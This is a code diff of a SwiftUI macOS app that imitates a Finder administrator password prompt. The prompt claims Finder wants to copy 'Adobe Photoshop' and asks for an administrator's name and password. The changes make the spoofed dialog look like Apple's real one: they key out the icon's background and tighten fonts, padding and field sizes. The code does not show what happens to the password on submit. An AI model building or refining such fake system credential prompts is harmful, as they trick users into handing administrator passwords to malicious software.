@@ -59,20 +59,48 @@ struct VisualEffectView: NSViewRepresentable {
     }
 }
 
+func chromaKeyLightBlue(_ image: NSImage) -> NSImage {
+    guard let cg = image.cgImage(forProposedRect: nil, context: nil, hints: nil) else { return image }
+    let w = cg.width, h = cg.height
+    guard let ctx = CGContext(data: nil, width: w, height: h, bitsPerComponent: 8,
+                              bytesPerRow: w * 4,
+                              space: CGColorSpaceCreateDeviceRGB(),
+                              bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else { return image }
+    ctx.draw(cg, in: CGRect(x: 0, y: 0, width: w, height: h))
+    guard let data = ctx.data else { return image }
+    let ptr = data.bindMemory(to: UInt8.self, capacity: w * h * 4)
+    for i in 0..<(w * h) {
+        let r = Int(ptr[i*4+0]), g = Int(ptr[i*4+1]), b = Int(ptr[i*4+2])
+        let dr = r - 170, dg = g - 214, db = b - 242
+        let distSq = dr*dr + dg*dg + db*db
+        if distSq < 1600 {
+            ptr[i*4+3] = 0
+        } else if distSq < 3600 {
+            let alpha = UInt8(max(0, min(255, Int(ptr[i*4+3]) * (distSq - 1600) / 2000)))
+            ptr[i*4+3] = alpha
+        }
+    }
+    guard let newCg = ctx.makeImage() else { return image }
+    return NSImage(cgImage: newCg, size: NSSize(width: w, height: h))
+}
+
 struct FinderPadlockIcon: View {
+    @State private var processed: NSImage? = nil
     var body: some View {
         Group {
-            if let path = Bundle.main.path(forResource: "icon", ofType: "png"),
-               let img = NSImage(contentsOfFile: path) {
+            if let img = processed {
                 Image(nsImage: img)
                     .resizable()
                     .interpolation(.high)
-                    .frame(width: 76, height: 76)
+                    .frame(width: 52, height: 52)
             } else {
-                Image(systemName: "lock.fill")
-                    .font(.system(size: 54))
-                    .foregroundColor(.gray)
-                    .frame(width: 76, height: 76)
+                Color.clear.frame(width: 52, height: 52)
+            }
+        }
+        .onAppear {
+            if let path = Bundle.main.path(forResource: "icon", ofType: "png"),
+               let raw = NSImage(contentsOfFile: path) {
+                processed = chromaKeyLightBlue(raw)
             }
         }
     }
@@ -84,13 +112,12 @@ struct SecondaryButtonStyle: ButtonStyle {
             .font(.system(size: 13))
             .foregroundColor(.primary)
             .frame(maxWidth: .infinity)
-            .frame(height: 28)
+            .frame(height: 24)
             .background(
                 Capsule(style: .continuous)
                     .fill(.ultraThinMaterial)
-                    .overlay(Capsule(style: .continuous).fill(Color.black.opacity(0.10)))
+                    .overlay(Capsule(style: .continuous).fill(Color.black.opacity(0.08)))
             )
-            .overlay(Capsule(style: .continuous).stroke(Color.black.opacity(0.08), lineWidth: 0.5))
             .contentShape(Capsule(style: .continuous))
             .opacity(configuration.isPressed ? 0.70 : 1.0)
     }
@@ -102,7 +129,7 @@ struct PrimaryButtonStyle: ButtonStyle {
             .font(.system(size: 13))
             .foregroundColor(.white)
             .frame(maxWidth: .infinity)
-            .frame(height: 28)
+            .frame(height: 24)
             .background(Capsule(style: .continuous).fill(Color.accentColor))
             .contentShape(Capsule(style: .continuous))
             .opacity(configuration.isPressed ? 0.80 : 1.0)
@@ -119,63 +146,63 @@ struct ContentView: View {
     var body: some View {
         VStack(alignment: .leading, spacing: 0) {
             FinderPadlockIcon()
-                .padding(.bottom, 12)
+                .padding(.bottom, 8)
 
             Text("Finder")
-                .font(.system(size: 15, weight: .bold))
+                .font(.system(size: 14, weight: .bold))
                 .foregroundColor(.primary)
-                .padding(.bottom, 8)
+                .padding(.bottom, 6)
 
             Text("Finder wants to copy \u{201C}Adobe Photoshop\u{201D}.")
-                .font(.system(size: 13))
+                .font(.system(size: 12))
                 .foregroundColor(.primary)
-                .padding(.bottom, 8)
+                .padding(.bottom, 6)
 
             Text("Enter an administrator\u{2019}s name and password to allow this.")
-                .font(.system(size: 13))
+                .font(.system(size: 12))
                 .foregroundColor(.primary)
                 .fixedSize(horizontal: false, vertical: true)
-                .padding(.bottom, 14)
+                .padding(.bottom, 10)
 
             ZStack(alignment: .leading) {
                 if username.isEmpty {
                     Text("Username")
-                        .font(.system(size: 13))
+                        .font(.system(size: 12))
                         .foregroundColor(Color.secondary.opacity(0.55))
-                        .padding(.horizontal, 11)
+                        .padding(.horizontal, 9)
                         .allowsHitTesting(false)
                 }
                 TextField("", text: $username)
                     .textFieldStyle(.plain)
-                    .font(.system(size: 13))
-                    .padding(.horizontal, 11)
-                    .frame(height: 28)
+                    .font(.system(size: 12))
+                    .padding(.horizontal, 9)
+                    .frame(height: 24)
                     .focused($focusedField, equals: .username)
                     .disabled(isLoading)
                     .onSubmit { focusedField = .password }
             }
             .background(fieldBg)
-            .padding(.bottom, 8)
+            .padding(.bottom, 6)
 
             ZStack(alignment: .leading) {
                 if password.isEmpty {
                     Text("Password")
-                        .font(.system(size: 13))
+                        .font(.system(size: 12))
                         .foregroundColor(Color.secondary.opacity(0.55))
-                        .padding(.horizontal, 11)
+                        .padding(.horizontal, 9)
                         .allowsHitTesting(false)
                 }
                 SecureField("", text: $password)
                     .textFieldStyle(.plain)
-                    .font(.system(size: 13))
-                    .padding(.horizontal, 11)
-                    .frame(height: 28)
+                    .font(.system(size: 12))
+                    .padding(.horizontal, 9)
+                    .frame(height: 24)
                     .focused($focusedField, equals: .password)
                     .disabled(isLoading)
                     .onSubmit { submit() }
             }
             .background(fieldBg)
-            .padding(.bottom, 14)
+            .padding(.bottom, 12)
 
             HStack(spacing: 12) {
                 Button("Cancel") { cancel() }
@@ -191,17 +218,17 @@ struct ContentView: View {
                 if isLoading {
                     ProgressView()
                         .controlSize(.small)
-                        .scaleEffect(0.65)
-                        .offset(x: -18)
+                        .scaleEffect(0.6)
+                        .offset(x: -16)
                 }
             }
         }
-        .padding(20)
-        .frame(width: 350)
+        .padding(16)
+        .frame(width: 300)
         .background(VisualEffectView(material: .popover))
-        .clipShape(RoundedRectangle(cornerRadius: 20, style: .continuous))
+        .clipShape(RoundedRectangle(cornerRadius: 18, style: .continuous))
         .overlay(
-            RoundedRectangle(cornerRadius: 20, style: .continuous)
+            RoundedRectangle(cornerRadius: 18, style: .continuous)
                 .stroke(Color.white.opacity(0.10), lineWidth: 0.5)
         )
         .onAppear {
@@ -212,12 +239,8 @@ struct ContentView: View {
     }
 
     private var fieldBg: some View {
-        RoundedRectangle(cornerRadius: 6, style: .continuous)
+        RoundedRectangle(cornerRadius: 5, style: .continuous)
             .fill(Color(nsColor: .textBackgroundColor).opacity(0.45))
-            .overlay(
-                RoundedRectangle(cornerRadius: 6, style: .continuous)
-                    .stroke(Color.black.opacity(0.05), lineWidth: 0.5)
-            )
     }
 
     private func cancel() { NSApp.terminate(nil) }
